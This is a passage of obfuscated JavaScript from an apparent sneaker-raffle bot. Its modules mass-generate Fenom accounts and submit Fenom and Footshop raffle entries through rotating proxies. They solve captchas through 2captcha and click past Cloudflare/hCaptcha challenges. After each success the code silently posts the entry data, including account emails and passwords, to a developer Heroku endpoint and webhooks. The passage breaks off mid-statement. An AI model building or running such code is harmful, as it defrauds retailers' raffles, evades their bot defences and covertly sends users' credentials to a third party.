                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x31d7c4, _0xb2608c, _0x5ac6a9) {
                    var _0x4b39b5 = _0xb2608c, _0x574ecb = 0x0;
                    for (var _0x3279db = 0x0; _0x3279db < _0xb2608c['length']; _0x3279db++) {
                        maxTasks = Number(_0x2795a0['threads']);
                        while (_0x574ecb >= maxTasks) {
                            await _0xa2099c(_0x2795a0['delay']);
                        }
                        let _0x2568b5 = ![];
                        async function _0x5e5890(_0x103e04, _0x1c87ef, _0x13c836, _0x2c5071, _0x1bcd9a) {
                            _0x574ecb++, _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x2795a0['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x14b57d != 'yes')
                                var _0x14b57d = '', _0x1bcd9a = 0x0;
                            var _0x21adde;
                            try {
                                await _0x53ad15(_0x1c87ef, _0x2c5071);
                            } catch {
                                _0x14b57d = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x215576(_0x103e04['name'] + '\x20Task\x20' + (_0x2c5071 + 0x1) + '\x20/\x20' + _0x1c87ef['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                            var _0x22dbf6 = await _0x258e8b(_0x1c87ef[_0x2c5071], _0x103e04, 'acc', ![]);
                            const _0x17f9a3 = { 'succesDEVMSG': { 'embeds': [_0x22dbf6] } }, _0x5a6978 = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x44c3f5 = Math['round'](Math['random']() * (_0x13c836['length'] - 0x1)), _0xd41905 = _0x13c836[_0x44c3f5]['split'](':'), _0x59d251;
                            async function _0x271495(_0x313cba) {
                                const _0x3f29a7 = _0x376369['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x4ba74a = _0x4f3c15['parse'](_0x3f29a7, { 'header': !![] })['data'];
                                let _0x21a9be = ![];
                                for (var _0xb00f66 of _0x4ba74a) {
                                    if (_0xb00f66['Email'] == _0x313cba['Email']) {
                                        _0x21a9be = !![];
                                        break;
                                    }
                                }
                                return _0x21a9be;
                            }
                            try {
                                if (await _0x271495(_0x1c87ef[_0x2c5071]) == !![]) {
                                    console['log'](_0x24b1d6() + '\x20[' + _0x103e04['name'] + ']\x20Task\x20' + (_0x2c5071 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x2568b5 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x59d251 = await _0xfda795['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0xd41905[0x0] + ':' + _0xd41905[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x59d251 = await _0xfda795['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0xd41905[0x0] + ':' + _0xd41905[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x2a13ac = await _0x59d251['newPage']();
                                await _0x2a13ac['setViewport']({
                                    'width': 0x500 + _0x49c08b(0x1, 0x32),
                                    'height': 0x2d9 + _0x49c08b(0x1, 0x32)
                                });
                                const _0x3636a5 = await _0x2a13ac['target']()['createCDPSession'](), { windowId: _0x37872a } = await _0x3636a5['send']('Browser.getWindowForTarget');
                                await _0x2a13ac['authenticate']({
                                    'username': '' + _0xd41905[0x2],
                                    'password': '' + _0xd41905[0x3]
                                }), console['log'](_0x24b1d6() + '\x20[' + _0x103e04['name'] + ']\x20Task\x20' + (_0x2c5071 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2a13ac['goto']('' + _0x5a6978, { 'waitUntil': 'networkidle2' }), console['log'](_0x24b1d6() + '\x20[' + _0x103e04['name'] + ']\x20Task\x20' + (_0x2c5071 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xa2099c(0x1388);
                                var _0x2150d1 = await _0x2a13ac['$']('.hcaptcha-box');
                                if (_0x2150d1) {
                                    console['log'](_0x24b1d6() + '\x20[' + _0x103e04['name'] + ']\x20Task\x20' + (_0x2c5071 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xa2099c(0x2710);
                                    const _0xd9ee59 = await _0x2a13ac['$']('.hcaptcha-box');
                                    if (_0xd9ee59)
                                        try {
                                            await _0xd9ee59['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x2a13ac['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x5a4838 = await _0x2a13ac['$']('.hcaptcha-box');
                                        if (_0x5a4838)
                                            try {
                                                await _0x5a4838['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x2a13ac['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x3636a5['send']('Browser.setWindowBounds', {
                                        'windowId': _0x37872a,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0xa2099c(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x24b1d6() + '\x20[' + _0x103e04['name'] + ']\x20Task\x20' + (_0x2c5071 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x2a13ac['type']('input[name=\x22firstname\x22]', '' + _0x1c87ef[_0x2c5071]['FirstName']), await _0xa2099c(0x1f4), await _0x2a13ac['type']('input[name=\x22lastname\x22]', '' + _0x1c87ef[_0x2c5071]['LastName']), await _0xa2099c(0x1f4), await _0x2a13ac['type']('input[name=\x22email\x22]', '' + _0x1c87ef[_0x2c5071]['Email']), await _0xa2099c(0x1f4), await _0x2a13ac['type']('input[name=\x22password\x22]', '' + _0x1c87ef[_0x2c5071]['Password']), await _0xa2099c(0x258), await _0x2a13ac['$eval']('input[name=\x22psgdpr\x22]', _0xfff325 => _0xfff325['click']()), await _0xa2099c(0x1f4), console['log'](_0x24b1d6() + '\x20[' + _0x103e04['name'] + ']\x20Task\x20' + (_0x2c5071 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2a13ac['$eval']('#customer-form', _0x429597 => _0x429597['submit']());
                                try {
                                    try {
                                        await _0x2a13ac['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x14b57d = 'no', console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x103e04['name'] + ']\x20Task\x20' + (_0x2c5071 + 0x1) + '\x20:\x20Account\x20' + _0x1c87ef[_0x2c5071]['Email'] + '\x20Generated')), _0x376369['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x1c87ef[_0x2c5071]['Email'] + ',' + _0x1c87ef[_0x2c5071]['Password']);
                                    let _0x53b47f = _0x1c87ef[_0x2c5071];
                                    try {
                                        prxdata = {
                                            'username': _0x1bdb7f['replace']('#', ''),
                                            'module': _0x103e04['name'],
                                            'entrydata': JSON['stringify'](_0x53b47f),
                                            'proxy': '' + _0x13c836[_0x2c5071]
                                        };
                                        var _0x103ddf = JSON['stringify'](prxdata);
                                        let _0x41a883 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x103ddf, _0x41a883);
                                    } catch (_0x446854) {
                                    }
                                    try {
                                        _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x17f9a3['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x310f97(_0x203e00, _0x17f9a3['succesDEVMSG']);
                                } catch (_0x117878) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x87178f) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x103e04['name'] + ']\x20Task\x20' + (_0x2c5071 + 0x1) + '\x20:\x20' + _0x87178f)), _0x21adde = '' + _0x87178f;
                                var _0x62ee77 = await _0x258e8b(_0x1c87ef[_0x2c5071], _0x103e04, 'acc', !![], _0x21adde);
                                _0x17f9a3['errorDEV'] = { 'embeds': [_0x62ee77] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x17f9a3['errorDEV']), await _0x310f97(_0x281108, _0x17f9a3['errorDEV']), _0x14b57d = 'yes';
                            } finally {
                                _0x59d251 && _0x59d251['close']();
                                if (_0x14b57d == 'yes' && _0x1bcd9a != 0x5)
                                    return console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x103e04['name'] + ']\x20Task\x20' + (_0x2c5071 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1bcd9a + '\x20/\x205)')), _0x1bcd9a = _0x1bcd9a + 0x1, _0x574ecb--, _0x5e5890(_0x103e04, _0x1c87ef, _0x13c836, _0x2c5071, _0x1bcd9a);
                                _0x14b57d == 'yes' && _0x1bcd9a >= 0x5 && _0x391951(_0x1c87ef[_0x2c5071], _0x103e04), !_0x2568b5 && (console['log'](_0x24b1d6() + '\x20[' + _0x103e04['name'] + ']\x20Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay'])), _0x574ecb--;
                            }
                        }
                        _0x5e5890(_0x31d7c4, _0x4b39b5, _0x5ac6a9, _0x3279db), !_0x2568b5 && await _0xa2099c(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x45ab9a(_0x23f736, _0x4455a0, _0x118832) {
                    _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2795a0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x47b323 = 0x0; _0x47b323 < _0x4455a0['length']; _0x47b323++) {
                        if (_0x1acd07 != 'yes')
                            var _0x1acd07 = '', _0x2493bb = 0x0;
                        var _0x57a9d1;
                        try {
                            await _0x53ad15(_0x4455a0, _0x47b323);
                        } catch {
                            _0x1acd07 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x215576(_0x23f736['name'] + '\x20Task\x20' + (_0x47b323 + 0x1) + '\x20/\x20' + _0x4455a0['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                        const _0x1bf391 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x5b7dd1 = Math['round'](Math['random']() * (_0x118832['length'] - 0x1)), _0x247cdb = _0x118832[_0x5b7dd1]['split'](':'), _0x4b02ef;
                        try {
                            _0x4b02ef = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x247cdb[0x0] + ':' + _0x247cdb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4b02ef = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x247cdb[0x0] + ':' + _0x247cdb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5a3569 = await _0x4b02ef['newPage'](), _0x11d543 = await _0x5a3569['target']()['createCDPSession'](), { windowId: _0x558f87 } = await _0x11d543['send']('Browser.getWindowForTarget');
                            await _0x5a3569['authenticate']({
                                'username': '' + _0x247cdb[0x2],
                                'password': '' + _0x247cdb[0x3]
                            }), console['log'](_0x24b1d6() + '\x20[' + _0x23f736['name'] + ']\x20Task\x20' + (_0x47b323 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a3569['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x24b1d6() + '\x20[' + _0x23f736['name'] + ']\x20Task\x20' + (_0x47b323 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xa2099c(0x1388);
                            var _0x55a6c3 = await _0x5a3569['$']('.hcaptcha-box');
                            if (_0x55a6c3) {
                                console['log'](_0x24b1d6() + '\x20[' + _0x23f736['name'] + ']\x20Task\x20' + (_0x47b323 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xa2099c(0x2710);
                                const _0x2c9af5 = await _0x5a3569['$']('.hcaptcha-box');
                                if (_0x2c9af5)
                                    try {
                                        await _0x2c9af5['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x5a3569['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x122452 = await _0x5a3569['$']('.hcaptcha-box');
                                    if (_0x122452)
                                        try {
                                            await _0x122452['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x11d543['send']('Browser.setWindowBounds', {
                                'windowId': _0x558f87,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xa2099c(0x1f40);
                            try {
                                await _0x5a3569['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0xa2099c(0x1388), console['log'](_0x24b1d6() + '\x20[' + _0x23f736['name'] + ']\x20Task\x20' + (_0x47b323 + 0x1) + '\x20:\x20Logging\x20in'), await _0x5a3569['type']('input[name=\x22email\x22]', '' + _0x4455a0[_0x47b323]['Email']), await _0xa2099c(0x1f4), await _0x5a3569['type']('input[name=\x22password\x22]', '' + _0x4455a0[_0x47b323]['Password']), await _0xa2099c(0x258), await _0x5a3569['$eval']('#login-form', _0x1d61a7 => _0x1d61a7['submit']()), await _0x5a3569['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0xa2099c(0x1f4), await _0x5a3569['goto']('' + _0x4455a0[_0x47b323]['Url']), await _0x5a3569['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x24b1d6() + '\x20[' + _0x23f736['name'] + ']\x20Task\x20' + (_0x47b323 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4455a0[_0x47b323]['Size']);
                            if (_0x4455a0[_0x47b323]['Size'] != 'RANDOM') {
                                var _0x5bc7c9 = '\x20' + _0x4455a0[_0x47b323]['Size'] + '\x20';
                                const _0x20bab6 = await _0x5a3569['$x']('//span[contains(text(),\x20' + _0x5bc7c9 + ')]');
                                await _0x20bab6[0x0]['click']();
                            } else {
                                const _0x5d9294 = await _0x5a3569['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0xfce501 = Math['round'](Math['random']() * (_0x5d9294['length'] - 0x1));
                                await _0x5d9294[_0xfce501]['click']();
                            }
                            await _0xa2099c(0x258), await _0x5a3569['click']('#cookieChoiceDismiss'), await _0xa2099c(0x3e8), await _0x5a3569['type']('#instagram-account', '' + _0x4455a0[_0x47b323]['Follower']), await _0xa2099c(0x28a), await _0x5a3569['click']('#book-btn'), await _0xa2099c(0xbb8);
                            try {
                                await _0x5a3569['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0xa2099c(0x1f4), console['log'](_0x24b1d6() + '\x20[' + _0x23f736['name'] + ']\x20Task\x20' + (_0x47b323 + 0x1) + '\x20:\x20' + _0x536226['cyan']('Solving\x20Captcha')), await _0x5a3569['solveRecaptchas'](), console['log'](_0x24b1d6() + '\x20[' + _0x23f736['name'] + ']\x20Task\x20' + (_0x47b323 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xa2099c(0x7d0), await _0x5a3569['$eval']('#book-btn-for-sure', _0x3ca801 => _0x3ca801['click']()), await _0xa2099c(0x12c), await _0x5a3569['click']('#book-btn-for-sure'), await _0xa2099c(0xdac);
                            const _0x13739b = await _0x5a3569['$eval']('.reservation-popup\x20>\x20.title', _0x16e167 => {
                                return _0x16e167['innerHTML'];
                            });
                            if (_0x13739b) {
                                _0x1acd07 = 'no', _0x48af7e(_0x4455a0[_0x47b323], _0x23f736), console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x23f736['name'] + ']\x20Task\x20' + (_0x47b323 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x268c7b = await _0x258e8b(_0x4455a0[_0x47b323], _0x23f736, 'dev', ![]), _0x1d7405 = await _0x258e8b(_0x4455a0[_0x47b323], _0x23f736, 'pub', ![]);
                                let _0x7830cb = _0x4455a0[_0x47b323];
                                try {
                                    prxdata = {
                                        'username': _0x1bdb7f['replace']('#', ''),
                                        'module': _0x23f736['name'],
                                        'entrydata': JSON['stringify'](_0x7830cb),
                                        'proxy': '' + _0x118832[_0x47b323]
                                    };
                                    var _0x11aacd = JSON['stringify'](prxdata);
                                    let _0x1d1c13 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x11aacd, _0x1d1c13);
                                } catch (_0x33177c) {
                                }
                                const _0x426d74 = {
                                    'succesDEVMSG': { 'embeds': [_0x268c7b] },
                                    'succesPUBMSG': { 'embeds': [_0x1d7405] }
                                };
                                try {
                                    _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x426d74['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x426d74['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x44d24a, _0x426d74['succesPUBMSG']);
                                } catch (_0x3350fa) {
                                    console['log'](_0x536226['yellow'](_0x24b1d6() + '\x20[' + _0x23f736['name'] + ']\x20Task\x20' + (_0x47b323 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3350fa));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x7e5755) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x23f736['name'] + ']\x20Task\x20' + (_0x47b323 + 0x1) + '\x20:\x20' + _0x7e5755)), _0x57a9d1 = '' + _0x7e5755;
                            var _0x59b47c = await _0x258e8b(_0x4455a0[_0x47b323], _0x23f736, 'dev', !![], _0x57a9d1), _0x268c7b = await _0x258e8b(_0x4455a0[_0x47b323], _0x23f736, 'dev', ![]), _0x1d7405 = await _0x258e8b(_0x4455a0[_0x47b323], _0x23f736, 'pub', ![]);
                            const _0x22435f = {
                                'succesDEVMSG': { 'embeds': [_0x268c7b] },
                                'succesPUBMSG': { 'embeds': [_0x1d7405] }
                            };
                            _0x22435f['errorDEV'] = { 'embeds': [_0x59b47c] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x22435f['errorDEV']), await _0x310f97(_0x281108, _0x22435f['errorDEV']), _0x7e5755 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x1acd07 = 'yes');
                        } finally {
                            _0x4b02ef['close']();
                            if (_0x1acd07 == 'yes' && _0x2493bb != 0x5 && _0x57a9d1 != 'Size\x20Not\x20Found') {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x23f736['name'] + ']\x20Task\x20' + (_0x47b323 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2493bb + '\x20/\x205)')), _0x47b323 = _0x47b323 - 0x1, _0x2493bb = _0x2493bb + 0x1;
                                continue;
                            }
                            _0x1acd07 == 'yes' && _0x2493bb >= 0x5 && (_0x391951(_0x4455a0[_0x47b323], _0x23f736), _0x1acd07 = 'no', _0x2493bb = 0x0), console['log'](_0x24b1d6() + '\x20[' + _0x23f736['name'] + ']\x20Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x2a07ef, _0x1e7b39, _0x36ca67) {
                _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x2795a0['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x30c70d = 0x0; _0x30c70d < _0x1e7b39['length']; _0x30c70d++) {
                    var _0x1e3bcf;
                    if (_0x20fb77 != 'yes')
                        var _0x20fb77 = '', _0xd7eb73 = 0x0;
                    var _0x18bb87 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x1bdb7f
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x1e7b39[_0x30c70d]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x1e7b39[_0x30c70d]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x2795a0['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x39dec1
                            }
                        ]
                    }], _0x257ac5 = await _0x258e8b(_0x1e7b39[_0x30c70d], _0x2a07ef, 'dev', ![]), _0x25c092 = await _0x258e8b(_0x1e7b39[_0x30c70d], _0x2a07ef, 'pub', ![]);
                    const _0x5bf6fd = {
                        'succesDEVMSG': { 'embeds': [_0x257ac5] },
                        'succesPUBMSG': { 'embeds': [_0x25c092] }
                    }, _0x1259d0 = { 'embeds': _0x18bb87 };
                    try {
                        await _0x53ad15(_0x1e7b39, _0x30c70d);
                    } catch {
                        _0x20fb77 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x1e7b39[_0x30c70d]['Email'] == '' || _0x1e7b39[_0x30c70d]['FirstName'] == '' || _0x1e7b39[_0x30c70d]['LastName'] == '' || _0x1e7b39[_0x30c70d]['Country'] == '' || _0x1e7b39[_0x30c70d]['Size'] == '' || _0x1e7b39[_0x30c70d]['Address1'] == '' || _0x1e7b39[_0x30c70d]['Zip'] == '') {
                        console['log'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x1e7b39[_0x30c70d]['Email'] == '' || _0x1e7b39[_0x30c70d]['FirstName'] == '' || _0x1e7b39[_0x30c70d]['LastName'] == '' || _0x1e7b39[_0x30c70d]['Country'] == '' || _0x1e7b39[_0x30c70d]['Size'] == '' || _0x1e7b39[_0x30c70d]['Address1'] == '' || _0x1e7b39[_0x30c70d]['Zip'] == '' || _0x1e7b39[_0x30c70d]['Phone'] == '') {
                        console['log'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x4d830d = '' + _0x1e7b39[_0x30c70d]['Url'];
                    if (_0x2795a0['useRandomProxy'] = ![])
                        var _0x1fbe01 = _0x36ca67[_0x30c70d]['split'](':');
                    else
                        var _0x2c3bbe = Math['round'](Math['random']() * (_0x36ca67['length'] - 0x1)), _0x1fbe01 = _0x36ca67[_0x2c3bbe]['split'](':');
                    var _0x1da53c;
                    try {
                        _0x1da53c = await _0xfda795['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1fbe01[0x0] + ':' + _0x1fbe01[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x1da53c = await _0xfda795['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1fbe01[0x0] + ':' + _0x1fbe01[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x2054c4 = await _0x1da53c['newPage']();
                        await _0x2054c4['authenticate']({
                            'username': '' + _0x1fbe01[0x2],
                            'password': '' + _0x1fbe01[0x3]
                        }), console['log'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2054c4['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2054c4['setRequestInterception'](!![]), _0x2054c4['on']('request', _0x9ce9b9 => {
                            _0x9ce9b9['resourceType']() === 'image' || _0x9ce9b9['resourceType']() === 'font' || _0x9ce9b9['resourceType']() === 'media' ? _0x9ce9b9['abort']() : _0x9ce9b9['continue']();
                        });
                        try {
                            await _0x2054c4['goto'](_0x4d830d), await _0xa2099c(0xbb8), await _0x2054c4['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2054c4['click']('.control__JhutY'), await _0xa2099c(0x1f4);
                        if (_0x1e7b39[_0x30c70d]['Size'] != 'RANDOM')
                            try {
                                const _0x24313e = await _0x2054c4['$x']('//div[contains(text(),\x20\x27' + _0x1e7b39[_0x30c70d]['Size'] + '\x27)]');
                                await _0x24313e[0x0]['click']();
                            } catch {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x25699d = await _0x2054c4['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x74fca9 = Math['round'](Math['random']() * (_0x25699d['length'] - 0x1));
                            await _0x25699d[_0x74fca9]['click']();
                        }
                        await _0xa2099c(0x4b0);
                        const _0xd9c6ad = await _0x2054c4['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0xd9c6ad[0x0]['click'](), await _0x2054c4['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x2054c4['type']('input[name=\x22email\x22]', '' + _0x1e7b39[_0x30c70d]['Email']), await _0xa2099c(0x640), await _0x2054c4['type']('input[name=\x22phone\x22]', '' + _0x1e7b39[_0x30c70d]['Phone']), await _0xa2099c(0x4b0), await _0x2054c4['click']('button.btn.continue-button__1RtsS'), await _0xa2099c(0x4b0);
                        try {
                            await _0x2054c4['type']('input[name=\x22firstName\x22]', '' + _0x1e7b39[_0x30c70d]['FirstName']), await _0xa2099c(0x258);
                        } catch {
                            const _0x10a468 = await _0x2054c4['$$eval']('.invalid-feedback\x20>\x20div', _0x48e893 => {
                                return _0x48e893['map'](_0x16789a => _0x16789a['innerText']);
                            });
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20' + _0x10a468));
                            continue;
                        }
                        await _0x2054c4['type']('input[name=\x22lastName\x22]', '' + _0x1e7b39[_0x30c70d]['LastName']), await _0xa2099c(0xc8), await _0x2054c4['type']('input[name=\x22instagramUsername\x22]', '' + _0x1e7b39[_0x30c70d]['Follower']), await _0xa2099c(0x4b0), await _0x2054c4['click']('button.btn.continue-button__1RtsS'), await _0xa2099c(0x3e8), console['log'](_0x24b1d6() + '\x20[' + _0x2a07ef['name'] + ']\x20Task\x20' + (_0x30c70d + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x2054c4['select']('select[name=\x22country\x22]', '' + _0x1e7b39[_0x30c70d]['Country']), await _0xa2099c(0x2bc), await _0x2054c4['type']('input[name=\x22streetName\x22]', '' + _0x1e7b39[_0x30c70d]['Address1']), await _0xa2099c(0x258), await _0x2054c4['type']('input[name=\x22houseNumber\x22]', _0x1e7b39[_0x30c70d]['HouseNumber'] + '\x20' + _0x1e7b39[_0x30c70d]['Address2']), await _0xa2099c(0xc8), await _0x2054c4['type']('input[name=\x22postalCode\x22]', '' + _0x1e7b39[_0x30c70d]['Zip']), await _0xa2099c(0x1f4), await _0x2054c4['type']('input[name=\x22city\x22]', '' + _0x1e7b39[_0x30c70d]['City']), await _0xa2099c(0x4b0), await _0x2054c4['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0xa2099c(0x4b0), await 